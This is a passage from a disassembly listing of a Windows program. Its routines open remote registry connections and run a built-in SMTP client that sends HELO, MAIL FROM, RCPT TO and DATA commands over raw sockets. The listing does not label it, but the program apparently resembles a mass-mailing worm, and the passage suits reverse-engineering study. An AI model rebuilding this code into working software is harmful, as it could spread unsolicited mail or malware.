		push	0FFFFFFFFh	; cchMultiByte
		add	eax, ecx
		push	eax		; lpMultiByteStr
		push	1		; dwFlags
		push	ebx		; CodePage
		call	esi ; MultiByteToWideChar
		lea	eax, [ebp+hSCObject]
		push	eax
		lea	eax, [ebp+var_B64]
		push	2
		push	eax
		lea	eax, [ebp+WideCharStr]
		push	eax
		call	dword_491F0C
		test	eax, eax
		jnz	loc_402BE9
		push	ebx		; lpUsedDefaultChar
		push	ebx		; lpDefaultChar
		lea	eax, [ebp+MultiByteStr]
		push	edi		; cchMultiByte
		push	eax		; lpMultiByteStr
		mov	eax, [ebp+hSCObject]
		push	0FFFFFFFFh	; cchWideChar
		mov	[ebp+MultiByteStr], bl
		push	dword ptr [eax+18h] ; lpWideCharStr
		push	ebx		; dwFlags
		push	ebx		; CodePage
		call	ds:WideCharToMultiByte
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	80000002h	; hKey
		push	[ebp+lpMachineName] ; lpMachineName
		call	ds:RegConnectRegistryA ; Establish a connection	to a predefined
					; registry handle on another computer
		test	eax, eax
		jnz	short loc_402BDB
		lea	eax, [ebp+var_754]
		push	3
		push	eax
		call	sub_403BD8
		lea	eax, [ebp+MultiByteStr]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_290]
		push	eax		; char *
		lea	eax, [ebp+MultiByteStr]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_68C]
		push	ebx		; char *
		push	eax		; char *
		push	ebx		; char *
		lea	eax, [ebp+MultiByteStr]
		push	ebx		; char *
		push	eax		; char *
		mov	[ebp+var_68C], bl
		call	__splitpath
		lea	eax, [ebp+MultiByteStr]
		push	eax
		lea	eax, [ebp+var_68C]
		push	eax
		lea	eax, [ebp+var_754]
		push	eax
		push	[ebp+hKey]
		call	sub_404540
		add	esp, 3Ch
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey

loc_402BDB:				; CODE XREF: sub_40280F+353j
		mov	eax, dword_491F14
		cmp	eax, ebx
		jz	short loc_402BE9
		push	[ebp+hSCObject]
		call	eax

loc_402BE9:				; CODE XREF: sub_40280F+26Fj
					; sub_40280F+319j ...
		push	1
		pop	eax

loc_402BEC:				; CODE XREF: sub_40280F+2B4j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_40280F	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402BF1	proc near		; CODE XREF: sub_405FE9+55p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_C]
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		xor	ebx, ebx
		push	[ebp+arg_0]	; char *
		mov	[esi+18h], eax
		lea	eax, [esi+1Ch]
		mov	[esi], ebx
		push	eax		; char *
		mov	[esi+0Ch], ebx
		call	_strcpy
		mov	edi, [ebp+arg_8]
		mov	ax, word ptr [ebp+arg_4]
		push	edi
		mov	[esi+19Ch], ax
		mov	word ptr [esi+19Eh], 19h
		call	??2@YAPAXI@Z	; operator new(uint)
		add	esp, 0Ch
		cmp	eax, ebx
		mov	[esi+4], eax
		jnz	short loc_402C45

loc_402C39:				; CODE XREF: sub_402BF1+60j
		mov	dword ptr [esi+1A4h], 80000002h
		jmp	short loc_402CA8
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402C45:				; CODE XREF: sub_402BF1+46j
		push	edi
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, ebx
		pop	ecx
		mov	[esi+10h], eax
		jz	short loc_402C39
		push	edi		; size_t
		push	ebx		; int
		push	dword ptr [esi+4] ; void *
		mov	[esi+8], edi
		mov	[esi+14h], edi
		call	_memset
		push	edi		; size_t
		push	ebx		; int
		push	dword ptr [esi+10h] ; void *
		call	_memset
		add	esp, 18h
		lea	ecx, [esi+1A0h]
		mov	[esi+1A4h], ebx
		mov	[esi+1A8h], ebx
		push	1
		push	1
		push	[ebp+arg_4]
		mov	[esi+1ACh], ebx
		mov	[esi+11Ch], bl
		call	sub_4031D8
		test	eax, eax
		jnz	short loc_402CAC
		mov	dword ptr [esi+1A4h], 80000005h

loc_402CA8:				; CODE XREF: sub_402BF1+52j
		xor	eax, eax
		jmp	short loc_402CBC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402CAC:				; CODE XREF: sub_402BF1+ABj
		cmp	[esi+0Ch], ebx
		jz	short loc_402CB9
		cmp	[esi], ebx
		jz	short loc_402CB9
		push	1
		jmp	short loc_402CBB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402CB9:				; CODE XREF: sub_402BF1+BEj
					; sub_402BF1+C2j
		push	2

loc_402CBB:				; CODE XREF: sub_402BF1+C6j
		pop	eax

loc_402CBC:				; CODE XREF: sub_402BF1+B9j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	10h
sub_402BF1	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_402CC3	proc near		; CODE XREF: sub_405FE9+ABp
					; sub_405FE9+D5p
		push	esi
		mov	esi, ecx
		push	edi
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_402CD5
		push	eax
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_402CD5:				; CODE XREF: sub_402CC3+9j
		mov	eax, [esi+10h]
		test	eax, eax
		jz	short loc_402CE3
		push	eax
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_402CE3:				; CODE XREF: sub_402CC3+17j
		lea	edi, [esi+1A0h]
		push	0
		push	6
		push	offset aQuit	; "QUIT\r\n"
		mov	ecx, edi
		call	sub_403285

loc_402CF9:				; CODE XREF: sub_402CC3+3Fj
		mov	ecx, edi
		call	sub_4032C1
		test	eax, eax
		jz	short loc_402CF9
		cmp	eax, 1
		jnz	short loc_402D19
		push	0DDh
		mov	ecx, esi
		call	sub_402FEA
		mov	esi, eax
		jmp	short loc_402D1C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402D19:				; CODE XREF: sub_402CC3+44j
		push	1
		pop	esi

loc_402D1C:				; CODE XREF: sub_402CC3+54j
		mov	ecx, edi
		call	sub_4032B3
		mov	eax, esi
		pop	edi
		pop	esi
		retn
sub_402CC3	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_402D28	proc near		; CODE XREF: sub_405FE9+9Cp
		push	esi
		mov	esi, ecx
		push	edi
		mov	ax, [esi+19Ch]
		lea	edi, [esi+1A0h]
		push	eax
		lea	eax, [esi+1Ch]
		push	eax
		mov	ecx, edi
		call	sub_403222
		test	eax, eax
		jnz	short loc_402D56
		mov	eax, 80000001h
		mov	[esi+1A4h], eax
		jmp	short loc_402D81
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402D56:				; CODE XREF: sub_402D28+1Fj
					; sub_402D28+37j
		mov	ecx, edi
		call	sub_4032C1
		test	eax, eax
		jz	short loc_402D56
		cmp	eax, 1
		jnz	short loc_402D74
		push	0DCh
		mov	ecx, esi
		call	sub_402FEA
		jmp	short loc_402D81
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402D74:				; CODE XREF: sub_402D28+3Cj
		push	1
		mov	dword ptr [esi+1A4h], 80000003h
		pop	eax

loc_402D81:				; CODE XREF: sub_402D28+2Cj
					; sub_402D28+4Aj
		pop	edi
		pop	esi
		retn
sub_402D28	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402D84	proc near		; CODE XREF: sub_405FE9+C8p

var_104		= byte ptr -104h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 104h
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	eax, [esi+11Ch]
		push	eax
		lea	eax, [ebp+var_104]
		push	offset aHeloS	; "HELO	%s\r\n"
		push	eax
		call	_sprintf
		add	esp, 0Ch
		lea	eax, [ebp+var_104]
		lea	edi, [esi+1A0h]
		push	0
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax
		lea	eax, [ebp+var_104]
		push	eax
		mov	ecx, edi
		call	sub_403285

loc_402DD1:				; CODE XREF: sub_402D84+56j
		mov	ecx, edi
		call	sub_4032C1
		test	eax, eax
		jz	short loc_402DD1
		cmp	eax, 1
		jnz	loc_402E82
		mov	ebx, 0FAh
		mov	ecx, esi
		push	ebx
		call	sub_402FEA
		test	eax, eax
		jnz	loc_402E8F
		mov	ecx, esi
		call	sub_402E96
		test	eax, eax
		jnz	loc_402E8F
		and	[ebp+var_4], eax
		cmp	[esi], eax
		mov	edi, [esi+4]
		jbe	short loc_402E34

loc_402E13:				; CODE XREF: sub_402D84+AEj
		push	edi
		mov	ecx, esi
		call	sub_402F50
		test	eax, eax
		jnz	short loc_402E8F
		push	edi		; char *
		call	_strlen
		inc	[ebp+var_4]
		lea	edi, [edi+eax+1]
		mov	eax, [ebp+var_4]
		pop	ecx
		cmp	eax, [esi]
		jb	short loc_402E13

loc_402E34:				; CODE XREF: sub_402D84+8Dj
		push	0
		lea	edi, [esi+1A0h]
		push	7
		push	offset aData	; "DATA	\r\n"
		mov	ecx, edi
		call	sub_403285
		push	162h
		mov	ecx, esi
		call	sub_402FEA
		test	eax, eax
		jnz	short loc_402E8F
		push	eax
		mov	ecx, edi
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_403285
		push	0
		push	5
		push	offset a_	; "\r\n.\r\n"
		mov	ecx, edi
		call	sub_403285
		push	ebx
		mov	ecx, esi
		call	sub_402FEA
		jmp	short loc_402E8F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402E82:				; CODE XREF: sub_402D84+5Bj
		push	1
		mov	dword ptr [esi+1A4h], 80000003h
		pop	eax

loc_402E8F:				; CODE XREF: sub_402D84+70j
					; sub_402D84+7Fj ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_402D84	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_402E96	proc near		; CODE XREF: sub_402D84+78p
		push	ebx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+14h]
		add	eax, 64h
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ebx, eax
		pop	ecx
		test	ebx, ebx
		jnz	short loc_402EB5
		push	2
		pop	eax
		jmp	loc_402F4D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402EB5:				; CODE XREF: sub_402E96+15j
		push	ebp
		push	edi
		push	offset aMailFrom ; char	*
		push	ebx		; char *
		call	_strcpy
		mov	edi, [esi+10h]
		xor	ebp, ebp
		cmp	[esi+0Ch], ebp
		pop	ecx
		pop	ecx
		jbe	short loc_402EF3

loc_402ECE:				; CODE XREF: sub_402E96+5Bj
		push	edi		; char *
		push	ebx		; char *
		call	_strcat
		push	offset asc_40E038 ; char *
		push	ebx		; char *
		call	_strcat
		push	edi		; char *
		call	_strlen
		add	esp, 14h
		inc	ebp
		cmp	ebp, [esi+0Ch]
		lea	edi, [edi+eax+1]
		jb	short loc_402ECE

loc_402EF3:				; CODE XREF: sub_402E96+36j
		push	offset asc_40E06C ; char *
		push	ebx		; char *
		call	_strcat
		pop	ecx
		lea	edi, [esi+1A0h]
		pop	ecx
		push	0
		push	ebx		; char *
		call	_strlen
		pop	ecx
		push	eax
		push	ebx
		mov	ecx, edi
		call	sub_403285

loc_402F18:				; CODE XREF: sub_402E96+8Dj
		mov	ecx, edi
		call	sub_4032C1
		mov	ebp, eax
		test	ebp, ebp
		jz	short loc_402F18
		push	ebx
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		push	1
		pop	eax
		pop	edi
		cmp	ebp, eax
		pop	ebp
		jnz	short loc_402F43
		push	0FAh
		mov	ecx, esi
		call	sub_402FEA
		jmp	short loc_402F4D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402F43:				; CODE XREF: sub_402E96+9Dj
		mov	dword ptr [esi+1A4h], 80000003h

loc_402F4D:				; CODE XREF: sub_402E96+1Aj
					; sub_402E96+ABj
		pop	esi
		pop	ebx
		retn
sub_402E96	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_402F50	proc near		; CODE XREF: sub_402D84+92p

arg_0		= dword	ptr  0Ch

		push	ebx
		push	esi
		push	[esp+arg_0]	; char *
		mov	ebx, ecx
		call	_strlen
		add	eax, 64h
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	esi, eax
		pop	ecx
		test	esi, esi
		pop	ecx
		jnz	short loc_402F73
		push	2
		pop	eax
		jmp	short loc_402FE5
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402F73:				; CODE XREF: sub_402F50+1Cj
		push	ebp
		push	edi
		push	offset aRcptTo	; char *
		push	esi		; char *
		call	_strcpy
		push	[esp+10h+arg_0]	; char *
		push	esi		; char *
		call	_strcat
		push	offset asc_40E06C ; char *
		push	esi		; char *
		call	_strcat
		add	esp, 18h
		lea	edi, [ebx+1A0h]
		push	0
		push	esi		; char *
		call	_strlen
		pop	ecx
		push	eax
		push	esi
		mov	ecx, edi
		call	sub_403285

loc_402FB0:				; CODE XREF: sub_402F50+6Bj
		mov	ecx, edi
		call	sub_4032C1
		mov	ebp, eax
		test	ebp, ebp
		jz	short loc_402FB0
		push	esi
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		push	1
		pop	eax
		pop	edi
		cmp	ebp, eax
		pop	ebp
		jnz	short loc_402FDB
		push	0FAh
		mov	ecx, ebx
		call	sub_402FEA
		jmp	short loc_402FE5
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402FDB:				; CODE XREF: sub_402F50+7Bj
		mov	dword ptr [ebx+1A4h], 80000003h

loc_402FE5:				; CODE XREF: sub_402F50+21j
					; sub_402F50+89j
		pop	esi
		pop	ebx
		retn	4
sub_402F50	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402FEA	proc near		; CODE XREF: sub_402CC3+4Dp
					; sub_402D28+45p ...

var_404		= dword	ptr -404h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 404h
		push	esi
		mov	esi, ecx
		push	edi
		push	0
		lea	edi, [esi+1A0h]
		lea	eax, [ebp+var_404]
		push	400h
		push	eax
		mov	ecx, edi
		call	sub_40329C

loc_403012:				; CODE XREF: sub_402FEA+31j
		mov	ecx, edi
		call	sub_4032C1
		test	eax, eax
		jz	short loc_403012
		cmp	eax, 1
		jnz	short loc_403062
		lea	eax, [ebp+var_4]
		push	eax
		lea	eax, [ebp+var_404]
		push	offset aD	; "%d"
		push	eax
		call	_sscanf
		mov	eax, [ebp+arg_0]
		mov	ecx, [ebp+var_4]
		add	esp, 0Ch
		cmp	eax, ecx
		jz	short loc_40305E
		mov	dword ptr [esi+1A4h], 80000004h
		mov	[esi+1A8h], ecx
		mov	[esi+1ACh], eax
		push	2
		jmp	short loc_40306E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40305E:				; CODE XREF: sub_402FEA+58j
		xor	eax, eax
		jmp	short loc_40306F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403062:				; CODE XREF: sub_402FEA+36j
		mov	dword ptr [esi+1A4h], 80000003h
		push	1

loc_40306E:				; CODE XREF: sub_402FEA+72j
		pop	eax

loc_40306F:				; CODE XREF: sub_402FEA+76j
		pop	edi
		pop	esi
		leave
		retn	4
sub_402FEA	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403075	proc near		; CODE XREF: sub_405FE9+76p

arg_0		= dword	ptr  4

		push	[esp+arg_0]	; char *
		add	ecx, 11Ch
		push	ecx		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		retn	4
sub_403075	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40308A	proc near		; CODE XREF: sub_405FE9+91p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		push	[ebp+arg_0]	; char *
		mov	edi, [esi+10h]
		call	_strlen
		and	[ebp+var_4], 0
		cmp	dword ptr [esi+0Ch], 0
		pop	ecx
		mov	ebx, eax
		jbe	short loc_4030C1

loc_4030AB:				; CODE XREF: sub_40308A+35j
		push	edi		; char *
		call	_strlen
		inc	[ebp+var_4]
		lea	edi, [edi+eax+1]
		mov	eax, [ebp+var_4]
		pop	ecx
		cmp	eax, [esi+0Ch]
		jb	short loc_4030AB

loc_4030C1:				; CODE XREF: sub_40308A+1Fj
		sub	ebx, [esi+10h]
		mov	eax, [esi+14h]
		add	ebx, edi
		cmp	ebx, eax
		jbe	short loc_40311B
		mov	ecx, [esi+18h]
		add	eax, ecx
		push	eax
		mov	[esi+14h], eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ebx, eax
		pop	ecx
		test	ebx, ebx
		jnz	short loc_4030EE
		mov	dword ptr [esi+1A4h], 80000002h
		jmp	short loc_40312C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4030EE:				; CODE XREF: sub_40308A+56j
		push	dword ptr [esi+14h] ; size_t
		push	0		; int
		push	ebx		; void *
		call	_memset
		mov	eax, [esi+10h]
		mov	ecx, edi
		sub	ecx, eax
		push	ecx
		push	eax
		push	ebx
		call	_memcpy_0
		mov	eax, [esi+10h]
		push	eax
		sub	edi, eax
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 1Ch
		mov	[esi+10h], ebx
		add	edi, ebx

loc_40311B:				; CODE XREF: sub_40308A+41j
		push	[ebp+arg_0]	; char *
		push	edi		; char *
		call	_strcpy
		inc	dword ptr [esi+0Ch]
		mov	eax, [esi+0Ch]
		pop	ecx
		pop	ecx

loc_40312C:				; CODE XREF: sub_40308A+62j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
sub_40308A	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403133	proc near		; CODE XREF: sub_405FE9+85p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		push	[ebp+arg_0]	; char *
		mov	edi, [esi+4]
		call	_strlen
		and	[ebp+var_4], 0
		cmp	dword ptr [esi], 0
		pop	ecx
		mov	ebx, eax
		jbe	short loc_403168

loc_403153:				; CODE XREF: sub_403133+33j
		push	edi		; char *
		call	_strlen
		inc	[ebp+var_4]
		lea	edi, [edi+eax+1]
		mov	eax, [ebp+var_4]
		pop	ecx
		cmp	eax, [esi]
		jb	short loc_403153

loc_403168:				; CODE XREF: sub_403133+1Ej
		sub	ebx, [esi+4]
		mov	eax, [esi+8]
		add	ebx, edi
		cmp	ebx, eax
		jbe	short loc_4031C2
		mov	ecx, [esi+18h]
		add	eax, ecx
		push	eax
		mov	[esi+8], eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ebx, eax
		pop	ecx
		test	ebx, ebx
		jnz	short loc_403195
		mov	dword ptr [esi+1A4h], 80000002h
		jmp	short loc_4031D1
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403195:				; CODE XREF: sub_403133+54j
		push	dword ptr [esi+8] ; size_t
		push	0		; int
		push	ebx		; void *
		call	_memset
		mov	eax, [esi+4]
		mov	ecx, edi
		sub	ecx, eax
		push	ecx
		push	eax
		push	ebx
		call	_memcpy_0
		mov	eax, [esi+4]
		push	eax
		sub	edi, eax
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 1Ch
		mov	[esi+4], ebx
		add	edi, ebx

loc_4031C2:				; CODE XREF: sub_403133+3Fj
		push	[ebp+arg_0]	; char *
		push	edi		; char *
		call	_strcpy
		inc	dword ptr [esi]
		mov	eax, [esi]
		pop	ecx
		pop	ecx

loc_4031D1:				; CODE XREF: sub_403133+60j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
sub_403133	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4031D8	proc near		; CODE XREF: sub_402BF1+A4p

WSAData		= WSAData ptr -190h
arg_4		= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 190h
		push	ebx
		push	esi
		push	1
		lea	eax, [ebp+WSAData]
		pop	ebx
		mov	esi, ecx
		push	eax		; lpWSAData
		push	2		; wVersionRequested
		call	ds:WSAStartup
		movsx	eax, [ebp+arg_4]
		dec	eax
		dec	eax
		jnz	short loc_403202
		push	2
		pop	ebx

loc_403202:				; CODE XREF: sub_4031D8+25j
		movsx	eax, bx
		push	6		; protocol
		push	eax		; type
		push	2		; af
		call	ds:socket
		xor	ecx, ecx
		cmp	eax, 0FFFFFFFFh
		mov	[esi], eax
		pop	esi
		setnz	cl
		mov	eax, ecx
		pop	ebx
		leave
		retn	0Ch
sub_4031D8	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403222	proc near		; CODE XREF: sub_402D28+18p

name		= sockaddr ptr -10h
arg_0		= dword	ptr  8
hostshort	= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		mov	esi, ecx
		push	dword ptr [ebp+hostshort] ; hostshort
		call	ds:htons
		mov	word ptr [ebp+name.sa_data], ax
		lea	eax, [ebp+hostshort]
		push	eax
		mov	ecx, esi
		push	[ebp+arg_0]
		mov	[ebp+name.sa_family], 2
		call	sub_4032C5
		mov	eax, dword ptr [ebp+hostshort]
		push	10h		; namelen
		mov	[ebp+name.sa_data+2], al
		mov	al, [ebp+0Eh]
		mov	[ebp+name.sa_data+4], al
		mov	al, [ebp+0Fh]
		mov	[ebp+name.sa_data+3], ah
		mov	[ebp+name.sa_data+5], al
		lea	eax, [ebp+name]
		push	eax		; name
		push	dword ptr [esi]	; s
		call	ds:connect
		test	eax, eax
		pop	esi
		jz	short loc_40327E
		call	ds:WSAGetLastError
		xor	eax, eax
		jmp	short locret_403281
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40327E:				; CODE XREF: sub_403222+50j
		push	1
		pop	eax

locret_403281:				; CODE XREF: sub_403222+5Aj
		leave
		retn	8
sub_403222	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403285	proc near		; CODE XREF: sub_402CC3+31p
					; sub_402D84+48p ...

buf		= dword	ptr  4
len		= dword	ptr  8
flags		= dword	ptr  0Ch

		push	[esp+flags]	; flags
		push	[esp+4+len]	; len
		push	[esp+8+buf]	; buf
		push	dword ptr [ecx]	; s
		call	ds:send
		retn	0Ch
sub_403285	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40329C	proc near		; CODE XREF: sub_402FEA+23p

buf		= dword	ptr  4
len		= dword	ptr  8
